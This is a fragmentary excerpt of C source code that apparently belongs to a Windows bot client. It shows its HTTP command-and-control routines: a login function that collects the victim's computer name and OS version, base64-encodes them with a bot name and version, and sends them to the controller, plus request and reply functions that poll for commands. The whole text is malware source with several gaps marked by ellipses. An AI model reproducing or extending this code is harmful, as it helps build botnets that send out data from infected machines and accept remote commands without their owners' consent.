...
int __hxxp_request(int option, char *data, char *token) {
	unsigned *get = (char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, 9000);
	void *hRequest;
	int len;
	char buff[120];
...
int __hxxp_reply(char *reply) {
	unsigned char *get = (char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, 9000);
	void *hRequest;
	int len;
	
	_snprintf((char *)get, 9000, MSG_FORMAT, __get_botid(), 1, "0", "0");
	//_printf("GET: %s\n", get);
	hRequest = _HttpOpenRequestA(hConnect, (unsigned char *)METHOD, (unsigned char *)get, (unsigned char *)"HTTP/1.1", 0x00, 0x00, 0xa404f700, 0x00);
	_HttpSendRequestA(hRequest, 0x00, 0x00, 0x00, 0x00);
...
int __hxxp_login(void) {
	unsigned char *get = (char *)__alloc(9000);
	unsigned char *data = (char *)__alloc(4090);
	char *encode = (char *)__alloc(4096);
	...
	__get_info(&inf);
	_snprintf((char *)data,4090,LOGIN_FORMAT, inf.computer_name, inf.os_version, BOT_NAME, BOT_VERSION);
	if (__base64_encode(data, _lstrlenA(data), encode) == 0) {
		__free(encode);
		__free(data);
		__free(get);
		return(0);
	...
	_snprintf((char *)get, 9000, MSG_FORMAT, __get_botid(), 0, encode, "0");
	//_printf("GET: %s\n", get);
	hRequest = _HttpOpenRequestA(hConnect, (unsigned char *)METHOD, (unsigned char *)get, (unsigned char *)"HTTP/1.1", 0x00, 0x00, 0xa404f700, 0x00);
	_HttpSendRequestA(hRequest, 0x00, 0x00, 0x00, 0x00);
	_InternetReadFile(hRequest, reply, 2048, &len); // no necessary but in cases php no receive request without this call
	_InternetCloseHandle(hRequest);
